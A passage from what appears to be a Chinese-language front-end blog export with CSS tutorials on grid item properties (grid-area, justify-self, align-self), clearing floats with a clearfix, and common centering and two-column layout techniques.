<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-start-end-c.png" class="">
<p>如果没有声明结束网格线的值，那么网格子项将默认跨越 1 个网格轨迹。</p>
<h3 id="grid-area"><a class="markdownIt-Anchor" href="#grid-area"></a> grid-area</h3>
<p>给网格项取一个名字以让它被由<code>grid-template-areas</code>属性创建的模板引用。同时，这个属性也可以用来更简短地表示<code>grid-row-start</code>+ <code>grid-column-start</code> + <code>grid-row-end</code>+ <code>grid-column-end</code>。</p>
<p>值有：</p>
<ul>
<li><code>&lt;name&gt;</code> - 一个你选择的名字</li>
<li><code>&lt;row-start&gt;</code> / <code>&lt;column-start&gt;</code> / <code>&lt;row-end&gt;</code> / <code>&lt;column-end&gt;</code> - 可以是网格线的数字或名字</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: &lt;name&gt; | &lt;row-start&gt; / &lt;column-start&gt; / &lt;row-end&gt; / &lt;column-end&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<p>作为分配一个名字给网格项的一种方式：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-d</span>&#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: header</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>作为<code>grid-row-start</code>+ <code>grid-column-start</code> + <code>grid-row-end</code>+ <code>grid-column-end</code>的一种简写：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-d</span>&#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: <span class="number">1</span> / col4-start / last-line / <span class="number">6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-start-end-d.png" class="">
<h3 id="justify-self"><a class="markdownIt-Anchor" href="#justify-self"></a> justify-self</h3>
<p>让网格项的内容以列轴对齐（与之相反<code>align-self</code>是跟行轴对齐），这个值可以应用在单个网格项的内容中。</p>
<p>值有：</p>
<ul>
<li><strong>start</strong> - 让内容在网格区域左对齐</li>
<li><strong>end</strong> - 让内容在网格区域右对齐</li>
<li><strong>center</strong> - 让内容在网格区域中间对齐</li>
<li><strong>stretch</strong> - 填充整个网络区域的宽度（默认值）</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line">  <span class="attribute">justify-self</span>: start | end | center | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">justify-self</span>: start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-self-start.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">justify-self</span>: end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-self-end.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">justify-self</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-self-center.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">justify-self</span>: stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-self-stretch.png" class="">
<p>为了让网格中的所有项都对齐，这个行为也可以通过设置网格容器中的<code>justify-items</code>属性来实现。</p>
<h3 id="align-self"><a class="markdownIt-Anchor" href="#align-self"></a> align-self</h3>
<p>让网格项的内容以行轴对齐（与之相反<code>justify-self</code>是跟列轴对齐），这个值可以应用在单个网格项的内容中。</p>
<p>值有：</p>
<ul>
<li><strong>start</strong> - 让内容在网格区域上对齐</li>
<li><strong>end</strong> - 让内容在网格区域下对齐</li>
<li><strong>center</strong> - 让内容在网格区域中间对齐</li>
<li><strong>stretch</strong> - 填充着呢个网络区域的高度（默认值）</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line">  <span class="attribute">align-self</span>: start | end | center | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">align-self</span>: start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-self-start.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">align-self</span>: end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-self-end.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">align-self</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-self-center.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">align-self</span>: stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-self-stretch.png" class="">
<p>为了让网格中的所有项都对齐，这个行为也可以通过设置网格容器中的<code>align-items</code>属性来实现。</p>
]]></content>
      <categories>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>grid</tag>
      </tags>
  </entry>
  <entry>
    <title>css 浮动与清除浮动</title>
    <url>/hexolog/post/3a176a24.html</url>
    <content><![CDATA[<p>最好用的—:after伪元素法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">	<span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">	<span class="attribute">display</span>: block;</span><br><span class="line">	<span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/*visibility: hidden;*/</span></span><br><span class="line">	<span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">	*zoom: 1;  /*由于IE6-7不支持:after，使用 zoom:1触发 hasLayout*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p data-height="300" data-theme-id="30438" data-slug-hash="QmdrBm" data-default-tab="html,result" data-user="kuleyu" data-embed-version="2" data-pen-title="QmdrBm" class="codepen">See the Pen <a href="https://codepen.io/kuleyu/pen/QmdrBm/" target="_blank" rel="noopener">QmdrBm</a> by kuleyu (<a href="https://codepen.io/kuleyu" target="_blank" rel="noopener">@kuleyu</a>) on <a href="https://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p>
<script async src="https://static.codepen.io/assets/embed/ei.js"></script>
<hr />
<p><strong>参考</strong></p>
<ol>
<li><a href="http://www.iyunlu.com/view/css-xhtml/55.html" target="_blank" rel="noopener">那些年我们一起清除过的浮动</a></li>
</ol>
<p>[20]:</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>float</tag>
      </tags>
  </entry>
  <entry>
    <title>Css常见居中布局</title>
    <url>/hexolog/post/daebb2da.html</url>
    <content><![CDATA[<p>前端工程师的一门必修课程就是 CSS ( Cascading Style Sheet, 层叠样式表)，CSS 是一门艺术，学好 CSS 需要投入大量的时间去实践。今天我们主要聊一聊工作中常用到的 CSS 布局套路。</p>
<a id="more"></a>
<h3 id="水平居中"><a class="markdownIt-Anchor" href="#水平居中"></a> 水平居中</h3>
<h4 id="内联元素-inline"><a class="markdownIt-Anchor" href="#内联元素-inline"></a> <strong>内联元素 (inline)</strong></h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>内联元素水平居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：父元素下的子元素会继承 text-align: center 属性；当父元素宽度小于内联元素的宽度时无效。</span><br></pre></td></tr></table></figure>
<h4 id="块级元素-block"><a class="markdownIt-Anchor" href="#块级元素-block"></a> <strong>块级元素 (block)</strong></h4>
<h5 id="1-父元素不定宽子元素定宽300px"><a class="markdownIt-Anchor" href="#1-父元素不定宽子元素定宽300px"></a> 1、 父元素不定宽，子元素定宽(300px)</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.block</span>&#123;</span></span><br><span class="line">    	width: 200px;</span><br><span class="line">        margin-left: auto;</span><br><span class="line">        margin-right: auto；</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"block"</span>&gt;</span>块级元素水平居中<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="2-父元素定宽500px子元素定宽300px"><a class="markdownIt-Anchor" href="#2-父元素定宽500px子元素定宽300px"></a> 2、父元素定宽（500px），子元素定宽(300px)</h5>
<ul>
<li>第一种：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">		padding-left：150px；</span><br><span class="line">		padding-right：150px；</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.block</span>&#123;</span></span><br><span class="line">    	width: 200px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"block"</span>&gt;</span>块级元素水平居中<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二种：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">        width: 500px;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.block</span>&#123;</span></span><br><span class="line">    	width: 200px;</span><br><span class="line">        margin-left: auto;</span><br><span class="line">        margin-right: auto；</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"block"</span>&gt;</span>块级元素水平居中<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：推荐使用第一种方法。</span><br></pre></td></tr></table></figure>
<ul>
<li>使用绝对定位</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">		position: relative;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.inline</span>&#123;</span></span><br><span class="line"> 		position: absolute;</span><br><span class="line"> 		left: 50%;</span><br><span class="line"> 		transform: translateX(-50%);</span><br><span class="line"> 	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>绝对定位水平居中<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：该方法会适用于内联元素与块级元素；top、bottom、left、right 等属性是参考父元素而定，而 translate 是参考自身而定；值得注意的是，该方法会使内联元素计算出来的 display 属性为 block。</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 flex</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">		display: flex;</span><br><span class="line">		justify-content: center;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>内联元素 flex 水平居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：若浏览器支持 flex，则强烈推荐使用 flex 布局，父元素下块级元素与内联元素居中表现均为良好；注意在不改变 flex 的方向 flex-deriction 的时候（默认为水平方向），水平居中需设置 justify-content: center，当改变 flex 的方向时（flex-deriction: column），水平居中需设置 align-items: center，垂直居中同理。</span><br></pre></td></tr></table></figure>
<h3 id="垂直居中"><a class="markdownIt-Anchor" href="#垂直居中"></a> 垂直居中</h3>
<h4 id="内联元素"><a class="markdownIt-Anchor" href="#内联元素"></a> 内联元素</h4>
<ul>
<li>第一种：给父元素 padding</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">    	padding: 10px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.inline</span>&#123;</span></span><br><span class="line">        line-height: 30px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>内联元素垂直居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二种：给父元素 height</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">    	height: 50px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.inline</span>&#123;</span></span><br><span class="line">        line-height: 50px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>内联元素垂直居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：推荐使用第一种；内联元素的真正占据的高度是由其中文字的 line-height 决定，当内联元素的 line-height 等于其父元素的 height 时，内联元素垂直居中，且其中的文字也是垂直居中的。</span><br></pre></td></tr></table></figure>
<h4 id="块级元素"><a class="markdownIt-Anchor" href="#块级元素"></a> 块级元素</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">    	display: table;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.block</span>&#123;</span></span><br><span class="line">    	display: table-cell;</span><br><span class="line">    	vertical-align: middle;</span><br><span class="line">    	height: 50px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"block"</span>&gt;</span>块级元素垂直居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：table 定位兼容性良好 (IE8+)；父元素的高度可以利用 padding 撑开。</span><br></pre></td></tr></table></figure>
<ul>
<li>绝对定位</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">    	position: relative；</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.inline</span>&#123;</span></span><br><span class="line">		postion: absolute;</span><br><span class="line">		top: 50%;</span><br><span class="line">		transform: translateY(-50%);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>内联元素垂直居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明： 同水平居中，绝对定位适用于内联元素与块级元素；会使内联元素的 display 计算属性变为 block。</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 flex</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">    	display: flex;</span><br><span class="line">    	align-items: center;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>内联元素垂直居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明： 通水平居中，在浏览器支持的情况下，推荐使用 flex 布局。</span><br></pre></td></tr></table></figure>
<h3 id="水平垂直居中"><a class="markdownIt-Anchor" href="#水平垂直居中"></a> 水平垂直居中</h3>
<h4 id="绝对定位"><a class="markdownIt-Anchor" href="#绝对定位"></a> 绝对定位</h4>
<ul>
<li>第一种：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">    	position: relative；</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.inline</span>&#123;</span></span><br><span class="line">		postion: absolute;</span><br><span class="line">		top: 50%;</span><br><span class="line">		left: 50%;</span><br><span class="line">		transform: translate(-50%, -50%);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>内联元素垂直居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二种：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">    	position: relative；</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.inline</span>&#123;</span></span><br><span class="line">		position: absolute;</span><br><span class="line">		margin: auto;</span><br><span class="line">		top: 0;</span><br><span class="line">		bottom: 0;</span><br><span class="line">		left: 0;</span><br><span class="line">		right: 0;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>内联元素垂直居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：绝对居中的兼容性良好；第二种方法需要设置子元素的宽高，否则会占满父元素。</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 flex</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">    	display: flex;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.inline</span>&#123;</span></span><br><span class="line">        margin: auto;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"inline"</span>&gt;</span>内联元素垂直居中<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：flex 布局简便快捷，需要注意的是浏览器兼容性。</span><br></pre></td></tr></table></figure>
<h3 id="两列布局"><a class="markdownIt-Anchor" href="#两列布局"></a> 两列布局</h3>
<h4 id="使用-float"><a class="markdownIt-Anchor" href="#使用-float"></a> 使用 float</h4>
<ul>
<li>1、 一列定宽，一列自适应 (以左列定宽 100px 为例)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.left</span>&#123;</span></span><br><span class="line">    	float: left;</span><br><span class="line">        width: 100px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">        margin-left: 100px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左列定宽<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右列自适应<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：左列脱离标准文档流，右列仍处在标准文档流中，设置 margin-left: 100px; 使其举例左边 100px 以免被左列遮挡。</span><br></pre></td></tr></table></figure>
<ul>
<li>2、 一列不定宽，一列自适应 (以左列不定宽为例)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.left</span>&#123;</span></span><br><span class="line">    	float: left;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">   		overflw: hidden;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左列不定宽<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右列自适应<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="使用-flex"><a class="markdownIt-Anchor" href="#使用-flex"></a> 使用 flex</h4>
<ul>
<li>1、 一列定宽，一列自适应 (以左列定宽 100px 为例)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">        display: flex;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.left</span>&#123;</span></span><br><span class="line">    	width: 100px;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">		flex-grow: 1;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左列定宽<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右列自适应<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>2、 一列不定宽，一列自适应 (以左列不定宽为例)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">        display: flex;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">		flex-grow: 1;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左列不定宽<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span 